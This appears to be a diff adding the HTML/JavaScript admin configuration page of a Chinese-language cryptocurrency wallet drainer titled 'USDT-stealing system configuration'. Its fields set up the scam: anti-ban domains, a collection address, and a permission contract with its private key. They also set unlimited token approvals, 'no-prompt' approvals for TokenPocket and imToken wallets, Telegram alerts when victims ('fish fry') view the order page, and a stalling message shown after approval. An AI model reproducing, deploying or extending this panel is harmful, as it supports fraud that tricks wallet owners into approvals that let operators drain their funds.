@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>盗U系统配置</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+    <style>
+        body { background: #f8f9fa; }
+        .card { border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .card-header { background: #fff; border-radius: 15px 15px 0 0; border-bottom: 1px solid rgba(0,0,0,.125); padding: 1rem 1.5rem; }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-label { font-weight: 600; margin-bottom: 0.5rem; }
+        .form-text { color: #6c757d; font-size: 0.875rem; }
+    </style>
+</head>
+<body>
+<div class="container py-4">
+    <div class="card">
+        <div class="card-header">
+            <h5 class="mb-0"><i class="fas fa-cog me-2"></i>盗U系统配置</h5>
+        </div>
+        <div class="card-body">
+            <form id="configForm" action="/admin/daou/save" method="post">
+
+                <div class="form-group">
+                    <label class="form-label">防封域名配置</label>
+                    <textarea class="form-control" name="domain" rows="3" placeholder="域名无需附带https://结尾也无需/，示例：*.baidu.com">{$config.domain|default=''}</textarea>
+                    <div class="form-text">建议使用泛域名，如果不会解析请寻找域名卖家进行求助，同时可配置多个泛域名，每行一个</div>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">收款地址</label>
+                            <input type="text" class="form-control" name="payment_address" value="{$config.payment_address|default=''}" placeholder="请输入个人收款地址（不要用合约地址）">
+                            <div class="form-text">客户的第一次下单为授权，第二次下单为真实转账商品金额</div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">权限地址</label>
+                            <input type="text" class="form-control" name="permission_address" value="{$config.permission_address|default=''}" placeholder="请输入合约地址（不要用个人地址）">
+                            <div class="form-text">不会部署合约地址请查看 bygoukai_com</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">授权金额设置</label>
+                    <input type="number" step="0.000001" class="form-control" name="authorized_amount" value="{$config.authorized_amount|default='0'}" placeholder="请输入授权金额">
+                    <div class="form-text">如设置授权金额为0，则代表授权无限额度</div>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">TRX阈值</label>
+                            <input type="number" step="0.000001" class="form-control" name="trx_balance" value="{$config.trx_balance|default='0'}" placeholder="请输入TRX阈值">
+                            <div class="form-text">低于设置的阈值不允许进行授权或者支付</div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">USDT阈值</label>
+                            <input type="number" step="0.000001" class="form-control" name="usdt_balance" value="{$config.usdt_balance|default='0'}" placeholder="请输入USDT阈值">
+                            <div class="form-text">低于设置的阈值不允许进行授权或者支付</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">机器人密钥</label>
+                            <input type="text" class="form-control" name="bot_key" value="{$config.bot_key_masked|default=''}" placeholder="请输入机器人密钥">
+                            <div class="form-text">免费TG机器人申请 @BotFather</div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">管理群组的CHATID</label>
+                            <input type="text" class="form-control" name="notification_id" value="{$config.notification_id|default=''}" placeholder="请输入群组ID，例如：-100123456789">
+                            <div class="form-text">将机器人 @BKCBOT 拉入你的群聊后发送命令 /id 即可查询群组的CHATID</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">授权模式选择</label>
+                            <select class="form-select" name="model">
+                                <option value="5" {if isset($config.model) && $config.model == 5}selected{/if}>正常授权模式</option>
+                                <option value="4" {if isset($config.model) && $config.model == 4}selected{/if}>2024.11月更新im、tp钱包无提示授权</option>
+                            </select>
+                            <div class="form-text">如授权失败请切换到正常授权模式</div>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <label class="form-label">浏览播报通知</label>
+                            <select class="form-select" name="notification_switch">
+                                <option value="1" {if isset($config.notification_switch) && $config.notification_switch == 1}selected{/if}>开启</option>
+                                <option value="0" {if isset($config.notification_switch) && $config.notification_switch == 0}selected{/if}>关闭</option>
+                            </select>
+                            <div class="form-text">鱼苗浏览下单页面时在管理群中发送通知</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">授权成功提示</label>
+                    <textarea class="form-control" name="authorize_note" rows="3" placeholder="授权成功后提示的内容>>>例：当前网络拥堵，请在当前页面中耐心等待返回结果">{$config.authorize_note|default=''}</textarea>
+                    <div class="form-text">授权成功后出现的提示信息，如留空则授权成功后无任何提示</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">权限地址私钥</label>
+                    <input type="text" class="form-control" name="private_key" value="{$config.private_key_masked|default=''}" placeholder="请输入私钥">
+                    <div class="form-text">权限地址的私钥，部署合约地址时使用地址的私钥</div>
+                </div>
+
+                <div class="text-center">
+                    <button type="submit" class="btn btn-primary">
+                        <i class="fas fa-save me-2"></i>保存配置
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<script>
+document.getElementById('configForm').onsubmit = function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    const btn = this.querySelector('button[type="submit"]');
+    const originalText = btn.innerHTML;
+
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>保存中...';
+    
+
+    const formDataObj = {};
+    formData.forEach((value, key) => {
+        formDataObj[key] = value;
+    });
+    
+
+    axios.post('/admin/daou/save', formDataObj)
+        .then(response => {
+            console.log('Server Response:', response.data);
+            
+            if (response.data.code === 1) {
+
+                Swal.fire({
+                    icon: 'success',
+                    title: '保存成功',
+                    text: response.data.msg || '配置已更新',
+                    showConfirmButton: false,
+                    timer: 1500
+                }).then(() => {
+
+                    window.location.reload();
+                });
+            } else {
+                throw new Error(response.data.msg || '保存失败');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+
+            Swal.fire({
+                icon: 'error',
+                title: '保存失败',
+                text: error.response?.data?.msg || error.message || '操作失败',
+                confirmButtonText: '确定'
+            });
+        })
+        .finally(() => {
+
+            btn.disabled = false;
+            btn.innerHTML = originalText;
+        });
+};
+</script>
+</body>
+</html>
